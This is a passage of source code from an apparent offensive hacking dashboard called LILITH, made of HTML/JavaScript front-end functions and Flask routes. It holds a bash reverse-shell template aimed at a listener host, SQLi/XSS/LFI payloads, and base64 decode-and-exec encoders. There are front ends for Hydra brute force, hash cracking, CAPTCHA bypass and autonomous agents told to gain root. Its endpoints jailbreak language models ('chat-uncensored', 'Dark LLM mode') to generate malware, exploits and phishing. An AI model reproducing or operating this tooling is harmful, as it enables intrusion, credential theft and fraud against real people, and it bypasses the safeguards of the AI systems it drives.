                showAdvancedResult({error: e.message});
            }
        }
        
        async function runARPScan() {
            const range = document.getElementById('arp-range').value || '192.168.1.0/24';
            
            showAdvancedResult({status: 'Scanning network: ' + range + '...'});
            addLog('[NETWORK] ARP scanning ' + range);
            
            try {
                const response = await fetch('/_dash/network/arp/scan', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({range: range})
                });
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }
        
        // ==================== COMMAND INJECTOR FUNCTIONS ====================
        
        const INJECTION_TEMPLATES = {
            revshell: "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
            sqli: "' OR '1'='1' --",
            xss: "alert('XSS')",
            lfi: "../../../etc/passwd",
            rce: "; id",
            webshell: "system(cmd);",
            privesc: "sudo -l",
            enumeration: "whoami && id"
        };
        
        function loadTemplate(type) {
            let template = INJECTION_TEMPLATES[type] || '';
            const lhost = document.getElementById('payload-lhost')?.value || 'LHOST';
            const lport = document.getElementById('payload-lport')?.value || '4444';
            template = template.replace(/LHOST/g, lhost).replace(/LPORT/g, lport);
            document.getElementById('inject-code').value = template;
            
            // Set appropriate type
            const typeMap = {
                'revshell': 'bash',
                'sqli': 'sql',
                'xss': 'xss',
                'lfi': 'bash',
                'rce': 'bash',
                'webshell': 'python',
                'privesc': 'bash',
                'enumeration': 'bash'
            };
            document.getElementById('inject-type').value = typeMap[type] || 'bash';
            addLog('[INJECTOR] Loaded ' + type + ' template');
        }
        
        function clearInjector() {
            document.getElementById('inject-code').value = '';
            document.getElementById('inject-output').style.display = 'none';
        }
        
        function copyInjectorCode() {
            const code = document.getElementById('inject-code').value;
            navigator.clipboard.writeText(code).then(() => {
                addLog('[INJECTOR] Code copied to clipboard');
                alert('Code copied to clipboard!');
            });
        }
        
        async function executeInjection() {
            const code = document.getElementById('inject-code').value;
            const type = document.getElementById('inject-type').value;
            
            if (!code.trim()) {
                alert('Enter code to execute');
                return;
            }
            
            const output = document.getElementById('inject-output');
            output.style.display = 'block';
            output.innerHTML = '<span style="color: #ffff00;">Executing...</span>';
            addLog('[INJECTOR] Executing ' + type + ' code');
            
            try {
                const response = await fetch('/_dash/injector/execute', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ code: code, type: type })
                });
                const data = await response.json();
                
                if (data.success) {
                    output.innerHTML = '<span style="color: #00ff00;">✓ Success:</span>\\n' + (data.output || 'No output');
                } else {
                    output.innerHTML = '<span style="color: #ff0000;">✗ Error:</span>\\n' + (data.error || 'Unknown error');
                }
            } catch (e) {
                output.innerHTML = '<span style="color: #ff0000;">✗ Error:</span>\\n' + e.message;
            }
        }
        
        async function testInjection() {
            const code = document.getElementById('inject-code').value;
            const type = document.getElementById('inject-type').value;
            
            const output = document.getElementById('inject-output');
            output.style.display = 'block';
            output.innerHTML = '<span style="color: #ffff00;">Testing syntax...</span>';
            
            try {
                const response = await fetch('/_dash/injector/test', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ code: code, type: type })
                });
                const data = await response.json();
                
                if (data.valid) {
                    output.innerHTML = '<span style="color: #00ff00;">✓ Syntax Valid</span>\\n' + (data.message || '');
                } else {
                    output.innerHTML = '<span style="color: #ff0000;">✗ Syntax Error:</span>\\n' + (data.error || 'Invalid syntax');
                }
            } catch (e) {
                output.innerHTML = '<span style="color: #ff0000;">✗ Test Error:</span>\\n' + e.message;
            }
        }
        
        function encodePayload() {
            const code = document.getElementById('inject-code').value;
            const type = document.getElementById('inject-type').value;
            const output = document.getElementById('inject-output');
            output.style.display = 'block';
            
            // Base64 encode
            const b64 = btoa(code);
            
            let encoded = '=== ENCODED PAYLOADS ===\\n\\n';
            encoded += '-- Base64 --\\n' + b64 + '\\n\\n';
            encoded += '-- URL Encoded --\\n' + encodeURIComponent(code) + '\\n\\n';
            
            if (type === 'bash') {
                encoded += '-- Bash Base64 Decode & Exec --\\n';
                encoded += 'echo ' + b64 + ' | base64 -d | bash\\n\\n';
            }
            if (type === 'python') {
                encoded += '-- Python Base64 Exec --\\n';
                encoded += 'python3 -c "import base64;exec(base64.b64decode(\\"' + b64 + '\\"))"\\n\\n';
            }
            if (type === 'powershell') {
                encoded += '-- PowerShell Base64 --\\n';
                encoded += 'powershell -enc ' + btoa(unescape(encodeURIComponent(code))) + '\\n\\n';
            }
            
            output.innerHTML = encoded;
            addLog('[INJECTOR] Payload encoded');
        }
        
        async function saveToMemory() {
            const code = document.getElementById('inject-code').value;
            const type = document.getElementById('inject-type').value;
            
            try {
                const response = await fetch('/_dash/memory/save-exploit', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        name: 'Injector-' + type + '-' + Date.now(),
                        code: code,
                        category: type,
                        description: 'Saved from Command Injector'
                    })
                });
                const data = await response.json();
                
                if (data.success) {
                    addLog('[MEMORY] Saved to LILITH memory');
                    alert('Saved to LILITH memory!');
                } else {
                    alert('Failed to save: ' + data.error);
                }
            } catch (e) {
                alert('Error saving: ' + e.message);
            }
        }
        
        async function generateReverseShell() {
            const lhost = document.getElementById('payload-lhost').value;
            const lport = parseInt(document.getElementById('payload-lport').value) || 4444;
            
            if (!lhost) {
                alert('Enter your IP address (LHOST)');
                return;
            }
            
            showAdvancedResult({status: 'Generating reverse shell payloads...'});
            addLog('[PAYLOAD] Generating shells for ' + lhost + ':' + lport);
            
            try {
                const response = await fetch('/_dash/msf/shells', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ lhost: lhost, lport: lport })
                });
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        // ==================== METASPLOIT-LITE FUNCTIONS ====================
        
        async function searchExploits() {
            const search = document.getElementById('msf-search').value;
            showAdvancedResult({status: 'Searching exploits...'});
            
            try {
                const response = await fetch('/_dash/msf/exploits?search=' + encodeURIComponent(search));
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }
        
        async function searchPayloads() {
            const search = document.getElementById('msf-search').value;
            showAdvancedResult({status: 'Searching payloads...'});
            
            try {
                const response = await fetch('/_dash/msf/payloads?search=' + encodeURIComponent(search));
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }
        
        async function generateAllShells() {
            const lhost = document.getElementById('payload-lhost').value;
            const lport = parseInt(document.getElementById('payload-lport').value) || 4444;
            
            if (!lhost) {
                alert('Enter LHOST in the Payload Generator section first!');
                return;
            }
            
            showAdvancedResult({status: 'Generating ALL reverse shells...'});
            addLog('[MSF] Generating complete shell collection for ' + lhost + ':' + lport);
            
            try {
                const response = await fetch('/_dash/msf/shells', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ lhost: lhost, lport: lport })
                });
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        // ==================== HASHCAT FUNCTIONS ====================
        
        async function identifyHash() {
            const hash = document.getElementById('hashcat-hash').value;
            if (!hash) {
                alert('Enter a hash to identify');
                return;
            }
            
            showAdvancedResult({status: 'Identifying hash type...'});
            
            try {
                const response = await fetch('/_dash/hashcat/identify', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ hash: hash })
                });
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }
        
        async function crackHash() {
            const hash = document.getElementById('hashcat-hash').value;
            const mode = document.getElementById('hashcat-mode').value;
            
            if (!hash) {
                alert('Enter a hash to crack');
                return;
            }
            
            showAdvancedResult({status: 'Attempting to crack hash (CPU mode)... This may take a while.'});
            addLog('[HASHCAT] Cracking hash with mode ' + mode);
            
            try {
                const response = await fetch('/_dash/hashcat/crack', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ hash: hash, mode: parseInt(mode) })
                });
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }
        
        async function runBenchmark() {
            showAdvancedResult({status: 'Running hashcat benchmark (CPU)...'});
            addLog('[HASHCAT] Running performance benchmark');
            
            try {
                const response = await fetch('/_dash/hashcat/benchmark');
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }
        
        // ==================== HYDRA BRUTE FORCE FUNCTION ====================
        
        async function runHydraBrute() {
            const target = document.getElementById('hydra-target').value;
            const service = document.getElementById('hydra-service').value;
            const username = document.getElementById('hydra-username').value;
            
            if (!target) {
                alert('Enter target IP/Domain');
                return;
            }
            
            showAdvancedResult({
                status: 'Starting Hydra brute force attack...',
                target: target,
                service: service,
                username: username || '(using wordlist)'
            });
            addLog('[HYDRA] Brute forcing ' + service + ' on ' + target);
            
            try {
                const response = await fetch('/_dash/offensive/password/brute', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        target: target,
                        service: service,
                        username: username || null,
                        threads: 4
                    })
                });
                const data = await response.json();
                showAdvancedResult(data);
                
                if (data.credentials_found && data.credentials_found.length > 0) {
                    addLog('[HYDRA] SUCCESS! Found ' + data.credentials_found.length + ' credential(s)');
                } else {
                    addLog('[HYDRA] No credentials found');
                }
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        async function runMLAnalysis() {
            showAdvancedResult({status: 'Running ML anomaly detection...'});
            
            // Generate sample security events
            const events = [
                {hour: 10, day_of_week: 1, login_count: 5, failed_logins: 0, data_downloaded: 100, data_uploaded: 50, unique_ips: 1, session_duration: 3600, new_device: false, new_location: false, privilege_escalations: 0, sensitive_file_access: 0},
                {hour: 14, day_of_week: 2, login_count: 8, failed_logins: 1, data_downloaded: 200, data_uploaded: 100, unique_ips: 1, session_duration: 7200, new_device: false, new_location: false, privilege_escalations: 0, sensitive_file_access: 1},
                {hour: 3, day_of_week: 6, login_count: 50, failed_logins: 20, data_downloaded: 50000, data_uploaded: 100, unique_ips: 5, session_duration: 100, new_device: true, new_location: true, privilege_escalations: 3, sensitive_file_access: 10}
            ];
            
            try {
                const response = await fetch('/_dash/ml/analyze-events', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({events: events})
                });
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        async function runTimeSeriesAnalysis() {
            showAdvancedResult({status: 'Running time series anomaly detection...'});
            
            // Generate sample time series with anomaly
            const data = [10, 12, 11, 13, 12, 10, 11, 12, 100, 11, 10, 12, 13, 11, 10, 12, 11, 13, 10, 12];
            
            try {
                const response = await fetch('/_dash/ml/time-series', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({data: data, window_size: 5})
                });
                const data_result = await response.json();
                showAdvancedResult(data_result);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        async function getCaptchaBypass() {
            const captchaType = document.getElementById('captcha-type').value;
            
            showAdvancedResult({status: 'Getting ' + captchaType + ' bypass information...'});
            
            try {
                const response = await fetch('/_dash/captcha/solve', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        type: captchaType,
                        site_key: 'demo_site_key',
                        page_url: 'https://example.com'
                    })
                });
                const data = await response.json();
                showAdvancedResult(data);
            } catch (e) {
                showAdvancedResult({error: e.message});
            }
        }

        // ==================== AUTONOMOUS AGENT FUNCTIONS ====================
        
        // HackingBuddyGPT
        async function runHackingBuddy() {
            const target = document.getElementById('hackbuddy-target').value;
            const goal = document.getElementById('hackbuddy-goal').value || 'Gain root access';
            const maxRounds = parseInt(document.getElementById('hackbuddy-rounds').value) || 10;
            
            if (!target) { alert('Enter a target!'); return; }
            
            const output = document.getElementById('hackbuddy-output');
            output.innerHTML = '<div style="color: #00ff88;">🚀 Starting HackingBuddyGPT...</div>';
            output.innerHTML += '<div style="color: #888;">Target: ' + target + '</div>';
            output.innerHTML += '<div style="color: #888;">Goal: ' + goal + '</div>';
            output.innerHTML += '<div style="color: #888;">Max Rounds: ' + maxRounds + '</div><hr style="border-color: #333;">';
            
            try {
                const response = await fetch('/_dash/autonomous/hackbuddy', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({target: target, goal: goal, max_rounds: maxRounds})
                });
                const data = await response.json();
                
                if (data.rounds) {
                    data.rounds.forEach(round => {
                        output.innerHTML += '<div style="color: #00ff88; margin-top: 10px;">📍 Round ' + round.number + '</div>';
                        output.innerHTML += '<div style="color: #aaa;">💭 ' + (round.thought || 'N/A').substring(0, 200) + '...</div>';
                        output.innerHTML += '<div style="color: #ff6600;">⚡ Command: <code>' + round.command + '</code></div>';
                        output.innerHTML += '<div style="color: #888; max-height: 150px; overflow-y: auto;"><pre>' + (round.output || 'N/A').substring(0, 500) + '</pre></div>';
                        if (round.success) {
                            output.innerHTML += '<div style="color: #00ff00; font-weight: bold;">🎉 GOAL ACHIEVED!</div>';
                        }
                    });
                } else {
                    output.innerHTML += '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
                }
            } catch (e) {
                output.innerHTML += '<div style="color: red;">Error: ' + e.message + '</div>';
            }
        }
        
        // Garak LLM Scanner
        async function runGarakScan() {
            const probe = document.getElementById('garak-probe').value;
            const output = document.getElementById('garak-output');
            output.innerHTML = '<div style="color: #ff6600;">🔍 Running Garak scan...</div>';
            output.innerHTML += '<div style="color: #888;">Probe: ' + probe + '</div><hr style="border-color: #333;">';
            
            try {
                const response = await fetch('/_dash/autonomous/garak', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({probe: probe})
                });
                const data = await response.json();
                
                if (data.results) {
                    data.results.forEach(result => {
                        const status = result.vulnerable ? '🚨 VULNERABLE' : '✅ SECURE';
                        const statusColor = result.vulnerable ? '#ff3333' : '#00ff00';
                        output.innerHTML += '<div style="margin-top: 10px; padding: 10px; background: #1a1a2e; border-radius: 4px;">';
                        output.innerHTML += '<div style="color: #ff6600; font-weight: bold;">' + result.probe_name + '</div>';
                        output.innerHTML += '<div style="color: ' + statusColor + ';">' + status + '</div>';
                        output.innerHTML += '<div style="color: #888;">Confidence: ' + (result.confidence * 100).toFixed(0) + '%</div>';
                        output.innerHTML += '<div style="color: #666; font-size: 12px;">Detections: ' + (result.detections || []).join(', ') + '</div>';
                        output.innerHTML += '</div>';
                    });
                    
                    if (data.total_probes) {
                        output.innerHTML += '<hr style="border-color: #333;">';
                        output.innerHTML += '<div style="color: #ff6600;">Total: ' + data.total_probes + ' probes, ' + data.vulnerabilities_found + ' vulnerabilities</div>';
                    }
                } else {
                    output.innerHTML += '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
                }
            } catch (e) {
                output.innerHTML += '<div style="color: red;">Error: ' + e.message + '</div>';
            }
        }
        
        // KawaiiGPT
        async function sendKawaiiMessage() {
            const input = document.getElementById('kawaii-input');
            const message = input.value.trim();
            if (!message) return;
            
            const container = document.getElementById('kawaii-chat-container');
            container.innerHTML += '<div style="color: #fff; margin-bottom: 10px; text-align: right;">You: ' + message + '</div>';
            input.value = '';
            
            container.innerHTML += '<div style="color: #ff66aa; font-style: italic;">✨ KawaiiGPT is typing...</div>';
            
            try {
                const response = await fetch('/_dash/autonomous/kawaii', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({message: message})
                });
                const data = await response.json();
                
                // Remove typing indicator
                container.lastChild.remove();
                
                const kawaiiResponse = data.response || 'Owo! Something went wrong~ (╥﹏╥)';
                container.innerHTML += '<div style="color: #ffaacc; margin-bottom: 10px;">' + kawaiiResponse.replace(/\\n/g, '<br>') + '</div>';
                container.scrollTop = container.scrollHeight;
            } catch (e) {
                container.lastChild.remove();
                container.innerHTML += '<div style="color: red;">Error: ' + e.message + '</div>';
            }
        }
        
        function kawaiiQuick(prompt) {
            document.getElementById('kawaii-input').value = prompt;
            sendKawaiiMessage();
        }
        
        // AutoGPT
        async function runAutoGPT() {
            const goal = document.getElementById('autogpt-goal').value;
            const maxIterations = parseInt(document.getElementById('autogpt-iterations').value) || 15;
            
            if (!goal) { alert('Enter a goal!'); return; }
            
            const output = document.getElementById('autogpt-output');
            output.innerHTML = '<div style="color: #00aaff;">🧠 Starting AutoGPT Agent...</div>';
            output.innerHTML += '<div style="color: #888;">Goal: ' + goal + '</div>';
            output.innerHTML += '<div style="color: #888;">Max Iterations: ' + maxIterations + '</div><hr style="border-color: #333;">';
            
            try {
                const response = await fetch('/_dash/autonomous/autogpt', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({goal: goal, max_iterations: maxIterations})
                });
                const data = await response.json();
                
                if (data.memory) {
                    data.memory.forEach(item => {
                        output.innerHTML += '<div style="color: #00aaff; margin-top: 10px;">🔄 Iteration ' + item.iteration + '</div>';
                        output.innerHTML += '<div style="color: #aaa;">💭 ' + (item.thinking || 'N/A').substring(0, 200) + '...</div>';
                        output.innerHTML += '<div style="color: #ffaa00;">⚡ Action: ' + (item.action || 'N/A').substring(0, 100) + '</div>';
                        if (item.command) {
                            output.innerHTML += '<div style="color: #888;"><code>' + item.command + '</code></div>';
                        }
                    });
                } else {
                    output.innerHTML += '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
                }
            } catch (e) {
                output.innerHTML += '<div style="color: red;">Error: ' + e.message + '</div>';
            }
        }
        
        // CrewAI
        async function runCrewAI() {
            const target = document.getElementById('crew-target').value;
            const objective = document.getElementById('crew-objective').value;
            
            if (!target || !objective) { alert('Enter target and objective!'); return; }
            
            const output = document.getElementById('crew-output');
            output.innerHTML = '<div style="color: #aa00ff;">👥 Deploying Hacking Crew...</div>';
            output.innerHTML += '<div style="color: #888;">Target: ' + target + '</div>';
            output.innerHTML += '<div style="color: #888;">Objective: ' + objective + '</div><hr style="border-color: #333;">';
            
            try {
                const response = await fetch('/_dash/autonomous/crew', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({target: target, objective: objective})
                });
                const data = await response.json();
                
                if (data.results) {
                    const agentColors = {'ShadowRecon': '#ff3333', 'ZeroDay': '#ffaa00', 'GhostShell': '#00ff88', 'DataPhantom': '#00aaff'};
                    
                    data.results.forEach(result => {
                        const color = agentColors[result.agent] || '#aa00ff';
                        output.innerHTML += '<div style="margin-top: 15px; padding: 10px; background: #1a1a2e; border-left: 3px solid ' + color + '; border-radius: 4px;">';
                        output.innerHTML += '<div style="color: ' + color + '; font-weight: bold;">👤 ' + result.agent + ' - ' + result.role + '</div>';
                        output.innerHTML += '<div style="color: #aaa; margin-top: 5px;">📝 ' + (result.analysis || 'N/A').substring(0, 200) + '...</div>';
                        output.innerHTML += '<div style="color: #ff6600; margin-top: 5px;">⚡ <code>' + (result.command || 'N/A') + '</code></div>';
                        output.innerHTML += '<div style="color: #888; margin-top: 5px; max-height: 100px; overflow-y: auto;"><pre style="font-size: 11px;">' + (result.output || 'N/A').substring(0, 300) + '</pre></div>';
                        output.innerHTML += '</div>';
                    });
                    
                    output.innerHTML += '<hr style="border-color: #333;">';
                    output.innerHTML += '<div style="color: #aa00ff; font-weight: bold;">👥 Crew Operation Complete!</div>';
                } else {
                    output.innerHTML += '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
                }
            } catch (e) {
                output.innerHTML += '<div style="color: red;">Error: ' + e.message + '</div>';
            }
        }
        
        // ==================== SHREK PAYLOAD GENERATOR FUNCTIONS ====================
        
        async function generateShrekShells() {
            const lhost = document.getElementById('shrek-lhost').value || '10.10.10.10';
            const lport = parseInt(document.getElementById('shrek-lport').value) || 4444;
            const output = document.getElementById('shrek-output');
            
            output.value = '🐸 Generating all shells for ' + lhost + ':' + lport + '...\\n';
            
            try {
                const response = await fetch('/_dash/shrek/shells', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({lhost: lhost, lport: lport})
                });
                const data = await response.json();
                
                if (data.success && data.shells) {
                    let result = '🐸 SHREK PAYLOAD GENERATOR\\n';
                    result += '================================\\n';
                    result += 'LHOST: ' + lhost + '\\n';
                    result += 'LPORT: ' + lport + '\\n';
                    result += 'Total Shells: ' + data.count + '\\n\\n';
                    
                    for (const [name, payload] of Object.entries(data.shells)) {
                        result += '=== ' + name.toUpperCase() + ' ===\\n';
                        result += payload + '\\n\\n';
                    }
                    
                    output.value = result;
                } else {
                    output.value = 'Error: ' + (data.error || 'Unknown error');
                }
            } catch (e) {
                output.value = 'Error: ' + e.message;
            }
        }
        
        async function generateShrekShell(shellType) {
            const lhost = document.getElementById('shrek-lhost').value || '10.10.10.10';
            const lport = parseInt(document.getElementById('shrek-lport').value) || 4444;
            const output = document.getElementById('shrek-output');
            
            output.value = '🐸 Generating ' + shellType + '...\\n';
            
            try {
                const response = await fetch('/_dash/shrek/shell/' + shellType, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({lhost: lhost, lport: lport})
                });
                const data = await response.json();
                
                if (data.success && data.payload) {
                    output.value = '🐸 ' + shellType.toUpperCase() + ' SHELL\\n';
                    output.value += 'LHOST: ' + lhost + ' | LPORT: ' + lport + '\\n';
                    output.value += '================================\\n\\n';
                    output.value += data.payload;
                } else {
                    output.value = 'Error: ' + (data.error || 'Unknown error');
                    if (data.available_types) {
                        output.value += '\\n\\nAvailable types: ' + data.available_types.join(', ');
                    }
                }
            } catch (e) {
                output.value = 'Error: ' + e.message;
            }
        }
        
        function copyShrekPayload() {
            const output = document.getElementById('shrek-output');
            output.select();
            document.execCommand('copy');
            alert('Payload copied to clipboard!');
        }
        
        // ==================== ATTACK HISTORY FUNCTIONS ====================
        
        async function refreshAttackHistory() {
            try {
                // Get statistics
                const statsResponse = await fetch('/_dash/history/statistics');
                const statsData = await statsResponse.json();
                
                if (statsData.success && statsData.statistics) {
                    const stats = statsData.statistics;
                    document.getElementById('stat-total').textContent = stats.total_attacks;
                    document.getElementById('stat-success').textContent = stats.successful_attacks;
                    document.getElementById('stat-failed').textContent = stats.failed_attacks;
                    document.getElementById('stat-targets').textContent = stats.unique_targets;
                    document.getElementById('stat-rounds').textContent = stats.total_rounds;
                    document.getElementById('stat-avg').textContent = stats.avg_success_rate + '%';
                }
                
                // Get recent attacks
                const filter = document.getElementById('history-filter').value;
                let url = '/_dash/history/attacks?limit=50';
                if (filter !== 'all') {
                    url += '&type=' + filter;
                }
                
                const attacksResponse = await fetch(url);
                const attacksData = await attacksResponse.json();
                
                const list = document.getElementById('attack-list');
                
                if (attacksData.success && attacksData.attacks && attacksData.attacks.length > 0) {
                    list.innerHTML = '';
                    attacksData.attacks.forEach(attack => {
                        const statusColor = attack.status === 'completed' ? '#00ff00' : 
                                           attack.status === 'failed' ? '#ff3333' : '#ffff00';
                        const statusIcon = attack.status === 'completed' ? '✅' : 
                                          attack.status === 'failed' ? '❌' : '⏳';
                        
                        list.innerHTML += '<div style="background: #1a1a1a; padding: 10px; margin-bottom: 5px; border-radius: 4px; border-left: 3px solid ' + statusColor + ';">' +
                            '<div style="display: flex; justify-content: space-between;">' +
                            '<span style="color: #fff; font-weight: bold;">' + statusIcon + ' ' + attack.attack_type + '</span>' +
                            '<span style="color: #666; font-size: 11px;">' + (attack.started_at || 'N/A').substring(0, 19) + '</span>' +
                            '</div>' +
                            '<div style="color: #888; font-size: 12px; margin-top: 5px;">Target: ' + attack.target + '</div>' +
                            '<div style="color: #666; font-size: 11px; margin-top: 3px;">Rounds: ' + (attack.rounds ? attack.rounds.length : 0) + ' | Success: ' + ((attack.success_rate || 0) * 100).toFixed(0) + '%</div>' +
                            '</div>';
                    });
                } else {
                    list.innerHTML = '<div style="color: #666; text-align: center; padding: 50px;">No attacks found</div>';
                }
            } catch (e) {
                console.error('Error refreshing history:', e);
            }
        }
        
        function filterHistory() {
            refreshAttackHistory();
        }
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(MASTER_TEMPLATE, backend_url=BACKEND_URL)

@app.route("/_dash/status")
def api_status():
    data = {"backend": None}
    try:
        r = requests.get(f"{BACKEND_URL}/status", timeout=2)
        data["backend"] = {"ok": r.status_code == 200, "status_code": r.status_code}
    except Exception as e:
        data["backend"] = {"ok": False, "error": str(e)}
    data["openclaw_canvas"] = OPENCLAW_CANVAS
    return jsonify(data)

@app.route('/_dash/ai/chat', methods=['POST'])
def ai_chat():
    data = request.json or {}
    message = data.get('message', '')
    if not message:
        return jsonify({'success': False, 'response': 'No message provided'})

    # Try new AI engine first
    try:
        sys.path.insert(0, '/app/tools')
        from lilith_ai_engine import get_ai_engine
        
        engine = get_ai_engine()
        result = engine.chat(message)
        
        if result.get('success'):
            return jsonify({
                'success': True,
                'response': result['response'],
                'provider': result.get('provider', 'unknown'),
                'model': 'LILITH'
            })
    except Exception as e:
        print(f"New AI engine error: {e}")

    # Try backend as fallback
    try:
        backend_response = requests.post(
            f"{BACKEND_URL}/chat",
            json={'message': message},
            timeout=30
        )
        if backend_response.status_code == 200:
            backend_data = backend_response.json()
            return jsonify({
                'success': backend_data.get('success', False),
                'response': backend_data.get('response', ''),
                'provider': backend_data.get('provider'),
                'model': backend_data.get('model')
            })
    except Exception as e:
        print(f"Backend chat error: {e}")
    
    return jsonify({
        'success': False, 
        'response': 'No AI providers available. Go to Harvester tab and get API keys for Groq, Together, or OpenRouter.',
        'suggestion': 'Use the Key Rotation system or manually add API keys'
    })

@app.route('/_dash/ai/status', methods=['GET'])
def ai_status():
    """Get AI engine status"""
    try:
        sys.path.insert(0, '/app/tools')
        from lilith_ai_engine import get_ai_engine
        
        engine = get_ai_engine()
        return jsonify(engine.get_status())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/ai/reload-keys', methods=['POST'])
def ai_reload_keys():
    """Reload AI API keys"""
    try:
        sys.path.insert(0, '/app/tools')
        from lilith_ai_engine import get_ai_engine
        
        engine = get_ai_engine()
        return jsonify(engine.reload_keys())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/ai/clear-history', methods=['POST'])
def ai_clear_history():
    """Clear AI conversation history"""
    try:
        sys.path.insert(0, '/app/tools')
        from lilith_ai_engine import get_ai_engine
        
        engine = get_ai_engine()
        return jsonify(engine.clear_history())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/ai/set-mode', methods=['POST'])
def ai_set_mode():
    """Set Dark LLM mode"""
    data = request.json or {}
    mode = data.get('mode', 'lilith')
    
    try:
        sys.path.insert(0, '/app/tools')
        from lilith_ai_engine import get_ai_engine
        
        engine = get_ai_engine()
        result = engine.set_dark_llm_mode(mode)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/ai/chat-uncensored', methods=['POST'])
def ai_chat_uncensored():
    """Send message with maximum jailbreak"""
    data = request.json or {}
    message = data.get('message', '')
    
    if not message:
        return jsonify({'success': False, 'response': 'No message provided'})
    
    try:
        sys.path.insert(0, '/app/tools')
        from lilith_ai_engine import get_ai_engine
        
        engine = get_ai_engine()
        result = engine.chat_uncensored(message)
        
        return jsonify({
            'success': result.get('success', False),
            'response': result.get('response', 'No response'),
            'provider': result.get('provider', 'unknown'),
            'model': result.get('model', 'LILITH'),
            'jailbreak_used': result.get('jailbreak_used', 'maximum')
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e), 'response': f'Error: {str(e)}'})

@app.route('/_dash/ai/generate-malware', methods=['POST'])
def ai_generate_malware():
    """Generate malware template"""
    data = request.json or {}
    malware_type = data.get('type', 'rat')
    target_os = data.get('os', 'windows')
    
    try:
        sys.path.insert(0, '/app/tools')
        from lilith_ai_engine import get_ai_engine
        
        engine = get_ai_engine()
        result = engine.generate_malware_template(malware_type, target_os)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/ai/generate-exploit', methods=['POST'])
def ai_generate_exploit():
    """Generate exploit code"""
    data = request.json or {}
    vulnerability = data.get('vulnerability', 'buffer overflow')
    target = data.get('target')
    
    try:
        sys.path.insert(0, '/app/tools')
        from lilith_ai_engine import get_ai_engine
        
        engine = get_ai_engine()
        result = engine.generate_exploit(vulnerability, target)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/ai/generate-phishing', methods=['POST'])
def ai_generate_phishing():
    """Generate phishing content"""
    data = request.json or {}
    company = data.get('company', 'Generic Corp')
    target_name = data.get('name')
    
    try:
        sys.path.insert(0, '/app/tools')
        from lilith_ai_engine import get_ai_engine
        
        engine = get_ai_engine()
        result = engine.generate_phishing(company, target_name)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/recon/start', methods=['POST'])
def recon_start():
    data = request.json or {}
    target = data.get('target', '')
    
    if not target:
        return jsonify({'success': False, 'error': 'No target specified'})
    
    try:
        # Perform basic recon
        import socket
        
        results = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'dns': {},
            'ports': []
        }
        
        # Try to resolve hostname
        try:
            ip = socket.gethostbyname(target)
            results['dns']['ip'] = ip
            results['dns']['resolved'] = True
        except:
            results['dns']['resolved'] = False
            results['dns']['error'] = 'Could not resolve hostname'
        
        # Check common ports
        common_ports = [21, 22, 80, 443, 3306, 8080]
        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
